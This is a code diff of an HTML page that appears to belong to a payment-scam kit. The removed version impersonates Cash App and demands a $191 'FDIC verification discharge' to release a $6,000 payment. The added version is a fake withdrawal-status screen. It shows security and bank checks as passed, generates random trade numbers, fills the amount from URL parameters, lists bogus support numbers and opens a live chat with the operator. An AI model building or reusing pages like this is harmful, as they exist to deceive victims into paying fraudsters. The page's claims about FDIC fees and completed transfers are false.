@@ -3,161 +3,401 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Pending</title>
+    <title>Withdrawal Status</title>
+    <!-- FontAwesome for check icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Base Reset & Typography */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #121212; color: #000000; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-        .app-container {
-            width: 100%;
-            max-width: 420px;
-            height: 100vh;
-            height: 100dvh;
-            background-color: #ffffff;
+        body {
+            background-color: #121212;
+            color: #333;
             display: flex;
-            flex-direction: column;
-            position: relative;
-            overflow: hidden;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            padding: 20px 16px;
             border-radius: 24px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             border: 1px solid #222;
         }
 
-        /* Header */
-        .app-header {
+        /* Top Navigation Header Controls */
+        .top-nav {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            padding: 20px 20px;
-            background-color: #ffffff;
+            align-items: center;
+            margin-bottom: 12px;
         }
 
         .icon-btn {
             background: none;
             border: none;
-            color: #000000;
+            color: #111;
             cursor: pointer;
+            padding: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 4px;
         }
 
-        /* Content Area */
-        .action-content {
-            padding: 10px 24px 24px 24px;
-            flex-grow: 1;
+        /* Header Amount Row */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #111;
+        }
+
+        .amount {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        /* Details Info List */
+        .info-list {
             display: flex;
             flex-direction: column;
-            gap: 20px;
-            overflow-y: auto;
+            gap: 12px;
         }
 
-        .main-heading {
-            font-size: 26px;
-            font-weight: 700;
-            color: #111111;
-            letter-spacing: -0.5px;
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .label {
+            color: #888;
+        }
+
+        .value {
+            color: #333;
+            font-weight: 400;
+            word-break: break-all;
+            text-align: right;
+            max-width: 60%;
+        }
+
+        .status-pending {
+            color: #d9534f;
+            font-weight: 500;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #eee;
+            margin: 20px 0;
+        }
+
+        /* Process Section */
+        .process-section h3 {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+
+        .timeline {
+            position: relative;
+            padding-left: 10px;
+        }
+
+        /* Timeline Vertical Line */
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 19px;
+            top: 10px;
+            bottom: 25px;
+            width: 2px;
+            background-color: #28a745;
+        }
+
+        .timeline-item {
+            position: relative;
+            display: flex;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .timeline-item:last-child {
+            margin-bottom: 0;
+        }
+
+        /* Timeline Icons */
+        .timeline-icon {
+            position: relative;
+            z-index: 2;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #ffffff;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .timeline-item.completed .timeline-icon {
+            background-color: #28a745;
+            color: white;
+            font-size: 10px;
+        }
+
+        .timeline-item.active .timeline-icon {
+            border: 2px solid #28a745;
+            background-color: #ffffff;
+        }
+
+        .timeline-item.active .inner-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #28a745;
+            border-radius: 50%;
+        }
+
+        /* Timeline Content */
+        .timeline-content {
+            flex-grow: 1;
+        }
+
+        .timeline-title-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
             margin-bottom: 4px;
         }
 
-        .body-text {
-            font-size: 15px;
-            color: #444444;
+        .timeline-content h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #222;
+        }
+
+        .time {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .timeline-content p {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        /* Footer Help Section */
+        .footer-help {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
             line-height: 1.5;
         }
 
-        .section-label {
-            font-size: 11px;
-            font-weight: 700;
-            color: #777777;
-            letter-spacing: 0.8px;
-            text-transform: uppercase;
-            margin-top: 10px;
-            margin-bottom: -10px;
-        }
-
-        /* Chat Button Card */
-        .chat-action-card {
-            background-color: #f4f4f6;
-            border-radius: 20px;
-            padding: 18px 20px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
+        .footer-help a {
+            color: #28a745;
+            text-decoration: none;
             cursor: pointer;
-            transition: background-color 0.2s;
-            border: none;
-            width: 100%;
-            text-align: left;
-            margin-top: 5px;
         }
 
-        .chat-action-card:hover {
-            background-color: #eaeaec;
-        }
-
-        .chat-icon-box {
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #000000;
-        }
-
-        .chat-label {
-            font-size: 16px;
-            font-weight: 600;
-            color: #000000;
+        .call-charges {
+            color: #aaa;
+            margin-top: 4px;
         }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        
-        <!-- Header with Back (<) and Close (X) buttons -->
-        <header class="app-header">
+    <div class="container">
+        <!-- Top Navigation Controls -->
+        <div class="top-nav">
             <button class="icon-btn" onclick="window.location.href='dashboard.html'" aria-label="Go back">
-                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <svg viewBox="0 0 24 24" width="22" height="22" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
                     <polyline points="15 18 9 12 15 6"></polyline>
                 </svg>
             </button>
             <button class="icon-btn" onclick="window.location.href='dashboard.html'" aria-label="Close">
-                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <svg viewBox="0 0 24 24" width="22" height="22" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
                     <line x1="18" y1="6" x2="6" y2="18"></line>
                     <line x1="6" y1="6" x2="18" y2="18"></line>
                 </svg>
             </button>
-        </header>
-
-        <div class="action-content">
-            <h1 class="main-heading">Payment Pending</h1>
-            
-            <p class="body-text">
-                Cash App payments are usually available instantly. If a payment is showing as pending, it may require verification by the FDIC, which could mean that you need to take action. If this is the case, please note that your payment requires an FDIC verification discharge of $191.
-            </p>
-
-            <p class="body-text">
-                Once the checkout authorization payment has been completed, the deposit part-payment of $6,000 will be credited to your available withdrawal method within 10–20 minutes. It will automatically be processed and show as “Completed.” If it still shows as “Waiting to Complete,” simply swipe down on your Activity Feed to refresh the status. The funds will be available in your Cash App balance.
-            </p>
-
-            <div class="section-label">Contact Us</div>
-
-            <!-- Interactive Chat Button triggering Tawk.to -->
-            <button class="chat-action-card" onclick="if(typeof Tawk_API !== 'undefined'){ Tawk_API.toggle(); }">
-                <div class="chat-icon-box">
-                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
-                        <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"></path>
-                    </svg>
-                </div>
-                <div class="chat-label">Chat</div>
-            </button>
         </div>
 
+        <!-- Header -->
+        <div class="header">
+            <h2>Withdrawals</h2>
+            <span class="amount" id="display-amount">0.00 USD</span>
+        </div>
+
+        <!-- Details Info List -->
+        <div class="info-list">
+            <div class="info-item">
+                <span class="label">Status</span>
+                <span class="value status-pending">Pending</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Type</span>
+                <span class="value">Withdrawals</span>
+            </div>
+            <div class="info-item">
+                <span class="label" id="destination-label">Withdraw To</span>
+                <span class="value" id="display-destination">Loading...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Trade No.</span>
+                <span class="value" id="display-tradeno">---</span>
+            </div>
+            <div class="info-item">
+                <span class="label">After Balance</span>
+                <span class="value">---</span>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <!-- Process Section -->
+        <div class="process-section">
+            <h3>Process</h3>
+
+            <div class="timeline">
+                <!-- Step 1: Completed -->
+                <div class="timeline-item completed">
+                    <div class="timeline-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="timeline-content">
+                        <div class="timeline-title-row">
+                            <h4>Withdrawal Requested</h4>
+                            <span class="time" id="time-req-1">Just now</span>
+                        </div>
+                        <p>Your request has been submitted successfully.</p>
+                    </div>
+                </div>
+
+                <!-- Step 2: Completed -->
+                <div class="timeline-item completed">
+                    <div class="timeline-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="timeline-content">
+                        <div class="timeline-title-row">
+                            <h4>Security Check</h4>
+                            <span class="time" id="time-req-2">Just now</span>
+                        </div>
+                        <p>The request has passed the verification.</p>
+                    </div>
+                </div>
+
+                <!-- Step 3: Completed -->
+                <div class="timeline-item completed">
+                    <div class="timeline-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="timeline-content">
+                        <div class="timeline-title-row">
+                            <h4>Request to Financial Institution</h4>
+                            <span class="time" id="time-req-3">Just now</span>
+                        </div>
+                        <p>Your request has been submitted successfully.</p>
+                    </div>
+                </div>
+
+                <!-- Step 4: Active / Pending -->
+                <div class="timeline-item active">
+                    <div class="timeline-icon">
+                        <div class="inner-dot"></div>
+                    </div>
+                    <div class="timeline-content">
+                        <div class="timeline-title-row">
+                            <h4>Confirmation from Financial Institution</h4>
+                        </div>
+                        <p>Your request has been sent to your financial institution for processing. While the final status is usually received immediately, it may take longer in some cases, depending on their processing time.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer Help Section -->
+        <div class="footer-help">
+            <p>Need help? Reach out to <a href="#" onclick="if(typeof Tawk_API !== 'undefined'){ Tawk_API.toggle(); return false; }">Customer Service</a>,</p>
+            <p>or call <a href="tel:800, 888877866855">800, 888, 877, 866, 855</a> / <a href="tel: 833"> 833</a>.</p>
+            <p class="call-charges">Call charges may apply as per your service provider.</p>
+        </div>
     </div>
+
+    <!-- Script to dynamically load transaction information and exact date/timestamp -->
+    <script>
+        function getQueryParams() {
+            const params = {};
+            const queryString = window.location.search.substring(1);
+            const vars = queryString.split("&");
+            for (let i = 0; i < vars.length; i++) {
+                const pair = vars[i].split("=");
+                if (pair.length > 1) {
+                    params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
+                }
+            }
+            return params;
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const params = getQueryParams();
+            const savedIntent = JSON.parse(localStorage.getItem('currentTxIntent') || '{}');
+            
+            // Grab values from URL parameters or fallback to localStorage intent
+            const amountVal = params.amount || savedIntent.amount || "0.00";
+            const destinationVal = params.bank || savedIntent.rawTarget || savedIntent.target || "External Account";
+            const tradeNoVal = params.tradeno || savedIntent.tradeNo || ("261116" + Math.floor(100000 + Math.random() * 900000));
+            
+            // Capture Transaction Date (From URL param, saved intent, or current time fallback)
+            const txTimestamp = params.date || savedIntent.timestamp || Date.now();
+            const txDateObj = new Date(Number(txTimestamp) || Date.now());
+            const formattedTxDate = `${String(txDateObj.getDate()).padStart(2, '0')}/${String(txDateObj.getMonth() + 1).padStart(2, '0')}/${txDateObj.getFullYear()} ${String(txDateObj.getHours()).padStart(2, '0')}:${String(txDateObj.getMinutes()).padStart(2, '0')}`;
+
+            // Format Amount
+            const cleanAmount = String(amountVal).replace(/[^0-9.]/g, '');
+            const num = parseFloat(cleanAmount);
+            const formattedAmount = `${isNaN(num) ? amountVal : num.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
+            document.getElementById('display-amount').innerText = formattedAmount;
+
+            // Display Destination / Withdraw To
+            document.getElementById('display-destination').innerText = destinationVal;
+            
+            const labelEl = document.getElementById('destination-label');
+            if (destinationVal.startsWith('bc1') || destinationVal.startsWith('1') || destinationVal.startsWith('3')) {
+                labelEl.innerText = "Wallet Address";
+            } else if (destinationVal.startsWith('$')) {
+                labelEl.innerText = "Cash Tag";
+            } else {
+                labelEl.innerText = "Withdraw To";
+            }
+
+            // Display Trade Number
+            document.getElementById('display-tradeno').innerText = tradeNoVal;
+
+            // Display exact transaction date/time on timeline steps
+            document.getElementById('time-req-1').innerText = formattedTxDate;
+            document.getElementById('time-req-2').innerText = formattedTxDate;
+            document.getElementById('time-req-3').innerText = formattedTxDate;
+        });
+    </script>
 
     <!-- Tawk.to Live Chat Script Integration -->
     <script type="text/javascript">
